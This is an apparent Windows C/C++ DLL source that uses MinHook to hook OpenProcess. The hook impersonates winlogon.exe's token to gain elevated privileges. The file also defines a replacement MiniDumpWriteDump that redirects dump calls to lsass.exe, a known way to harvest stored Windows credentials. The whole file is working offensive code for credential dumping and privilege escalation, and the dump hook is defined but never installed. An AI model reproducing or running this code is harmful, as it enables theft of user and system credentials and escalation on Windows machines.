#include <windows.h>
#include <tlhelp32.h>
#include <DbgHelp.h>  // Include DbgHelp for MiniDumpWriteDump
#include <MinHook.h>  // Include MinHook for function hooking
#include <stdio.h>

// Original OpenProcess function pointer
typedef HANDLE(WINAPI* OpenProcessPrototype)(DWORD, BOOL, DWORD);
OpenProcessPrototype OriginalOpenProcess = NULL;

typedef BOOL(WINAPI* MiniDumpWriteDumpPrototype)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
MiniDumpWriteDumpPrototype OriginalMiniDumpWriteDump = NULL;

BOOL isInMiniDumpWriteDump = FALSE;  // Flag to prevent recursion

// Helper function to write to the console
void WriteToConsole(const wchar_t* message) {
    static bool consoleAllocated = false;
    if (!consoleAllocated) {
        AllocConsole();  // Allocate a new console if not already done
        consoleAllocated = true;
    }
    wprintf(L"%s", message);  // Output message to console
}

// Function to get a process ID by name
DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                    processId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return processId;
}

// Hooked OpenProcess function to handle impersonation
HANDLE WINAPI HookedOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    WriteToConsole(L"OpenProcess called\n");

    // Perform impersonation logic
    DWORD targetPid = GetProcessIdByName(L"winlogon.exe");  // Or change to "lsass.exe" if needed
    
    if (targetPid != 0) {
        WriteToConsole(L"Attempting to impersonate winlogon...\n");
        // Open winlogon.exe for impersonation using the *original* OpenProcess function
        HANDLE hProcess = OriginalOpenProcess(MAXIMUM_ALLOWED, FALSE, targetPid);
        if (hProcess != NULL) {
            HANDLE hToken = NULL;
            if (OpenProcessToken(hProcess, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                if (!ImpersonateLoggedOnUser(hToken)) {
                    WriteToConsole(L"Failed to impersonate winlogon\n");
                } else {
                    WriteToConsole(L"Successfully impersonated winlogon\n");
                }
                CloseHandle(hToken);
            } else {
                WriteToConsole(L"Failed to open winlogon token\n");
            }
            CloseHandle(hProcess);
        } else {
            WriteToConsole(L"Failed to open winlogon process\n");
        }
    } else {
        WriteToConsole(L"Failed to get winlogon process ID\n");
    }

    // Now, safely call the original OpenProcess with the original arguments
    return OriginalOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
}



// Hooked MiniDumpWriteDump function
BOOL WINAPI MyMiniDumpWriteDump(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
) {
    wchar_t buffer[1024];  // Increased size for the buffer to hold the DLL path

    swprintf(buffer, sizeof(buffer) / sizeof(buffer[0]),
             L"MiniDumpWriteDump called with:\n  ProcessId: %d\n  hProcess: 0x%p\n  hFile: 0x%p\n  DumpType: 0x%x\n",
             ProcessId, hProcess, hFile, DumpType);
    WriteToConsole(buffer);

    // Change ProcessId to LSASS
    DWORD newProcessId = GetProcessIdByName(L"lsass.exe");
    if (newProcessId != 0) {
        ProcessId = newProcessId;
        swprintf(buffer, sizeof(buffer) / sizeof(buffer[0]),
                 L"ProcessId changed to LSASS (PID: %d)\n", ProcessId);
        WriteToConsole(buffer);
    } else {
        WriteToConsole(L"Failed to get LSASS process ID\n");
    }

    // Forcefully load DbgHelp.dll every time for debugging purposes
    HMODULE hDbgHelp = LoadLibrary(L"C:\\Windows\\System32\\DbgCore.dll");
    if (!hDbgHelp) {
        WriteToConsole(L"Failed to load DbgHelp.dll\n");
        return FALSE;
    }

    // Get the path of the loaded DbgHelp.dll
    wchar_t dllPath[MAX_PATH];
    if (GetModuleFileName(hDbgHelp, dllPath, MAX_PATH)) {
        swprintf(buffer, sizeof(buffer) / sizeof(buffer[0]), L"Loaded DbgHelp.dll from: %s\n", dllPath);
        WriteToConsole(buffer);  // Print the DLL path
    } else {
        WriteToConsole(L"Failed to get DbgHelp.dll path\n");
    }

    // Call the original MiniDumpWriteDump function if it's already initialized
    if (!OriginalMiniDumpWriteDump) {
        OriginalMiniDumpWriteDump = (MiniDumpWriteDumpPrototype)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
        if (!OriginalMiniDumpWriteDump) {
            WriteToConsole(L"Failed to get address of MiniDumpWriteDump\n");
            return FALSE;
        }
    }

    // Call the real MiniDumpWriteDump function
    BOOL result = OriginalMiniDumpWriteDump(hProcess, ProcessId, hFile, DumpType, ExceptionParam, UserStreamParam, CallbackParam);

    // Output the result of MiniDumpWriteDump
    swprintf(buffer, sizeof(buffer) / sizeof(buffer[0]),
             L"MiniDumpWriteDump result: %s\n", result ? L"Success" : L"Failure");
    WriteToConsole(buffer);

    return result;
}


// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Initialize MinHook library
        if (MH_Initialize() != MH_OK) {
            WriteToConsole(L"Failed to initialize MinHook\n");
            return FALSE;
        }

        // Hook OpenProcess
        if (MH_CreateHook(&OpenProcess, &HookedOpenProcess, (LPVOID*)&OriginalOpenProcess) != MH_OK) {
            WriteToConsole(L"Failed to hook OpenProcess\n");
            return FALSE;
        }
        if (MH_EnableHook(&OpenProcess) != MH_OK) {
            WriteToConsole(L"Failed to enable OpenProcess hook\n");
            return FALSE;
        }

        WriteToConsole(L"Successfully hooked OpenProcess\n");
    } else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        MH_DisableHook(&OpenProcess);
        MH_Uninitialize();
        WriteToConsole(L"DLL unloading, hooks removed.\n");
    }
    return TRUE;
}
